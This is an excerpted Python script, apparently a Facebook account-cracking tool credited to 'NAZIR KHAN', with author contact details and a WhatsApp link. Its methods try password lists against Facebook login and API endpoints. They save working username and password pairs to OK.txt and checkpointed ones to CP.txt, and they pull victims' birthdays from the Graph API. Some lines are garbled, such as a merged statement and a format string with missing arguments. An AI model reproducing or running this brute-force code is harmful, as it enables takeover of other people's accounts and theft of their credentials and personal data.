...
class __crack__:
	...
	def plerr(self):
		...
		if _jokowi_kontol_ in ('M', 'm'):
			...
			IMTIAZ_AKING('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			IMTIAZ_AKING(' [1] NAZIR Method 1 ')
			IMTIAZ_AKING(' [2] NAZIR Method 2  [ Pro ]')
			IMTIAZ_AKING(' [3] NAZIR Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if "access_token" in p:
				IMTIAZ_AKING('\r\033[1;92m[Successful-NAZIR] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					...
					IMTIAZ_AKING('\r\033[1;91m[Checkpoint-NAZIR] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				IMTIAZ_AKING('\r\033[1;91m[Checkpoint-NAZIR] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				IMTIAZ_AKING('\r\033[1;32m[Successful-NAZIR] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					...
					cp_ttl = Prof_IMtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].IMTIAZ_AKING('\r\033[1;91m[Checkpoint-NAZIR] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				IMTIAZ_AKING('\r\033[1;92m[Successful-NAZIR] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
...
banner="""\033[1;37m
d8b   db  .d8b.  d88888D d888888b d8888b. 
888o  88 d8' `8b YP  d8'   `88'   88  `8D 
88V8o 88 88ooo88    d8'     88    88oobY' 
88 V8o88 88~~~88   d8'      88    88`8b 
88  V888 88   88  d8' db   .88.   88 `88. 
VP   V8P YP   YP d88888P Y888888P 88   YD 
                                    
 [*]=============================================
    Author   : NAZIR KHAN
    Facebook : https://facebook.com/NAZIR567
    Team     : AJMALO + SAMERO
    Connect  : 03025669420
 [*]=============================================
...
def dupcutter():
	os.system("xdg-open https://wa.me/+923025660420")
	time.sleep(3)
	readline___Public_Xml()
def sep():
	logo()
